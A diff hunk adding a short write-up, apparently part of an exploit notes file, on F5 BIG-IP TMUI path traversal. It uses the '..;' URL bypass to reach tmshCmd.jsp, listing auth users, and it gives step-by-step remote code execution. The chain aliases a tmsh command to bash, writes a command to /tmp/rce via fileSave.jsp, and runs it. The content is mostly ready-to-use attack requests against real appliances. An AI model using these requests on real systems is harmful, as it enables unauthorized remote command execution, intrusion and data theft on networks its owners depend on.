@@ -44,3 +44,25 @@ tmshCmd
 Execute predefined (based on their documentation) system commands through the command URL parameter
 
 https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user
+
+#You can achieve Remote Code Execution on the BIG-IP TMUI by chaining the fileSave and tmshCmd utility modules.
+
+First, you need to send this payload in order to be able to execute bash commands:
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash (GET method)
+Next, you’ll have to upload a file containing the command you want to execute on the system:
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/rce&content=whoami (POST method) - Here we uploaded the /tmp/rce file containing the whoami command.
+Finally, you must list the file and you’ll see the output of the executed command reflected in the file content:
+
+https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/rce
+
+(GET method)
+
+
+
+
+
+
+
+
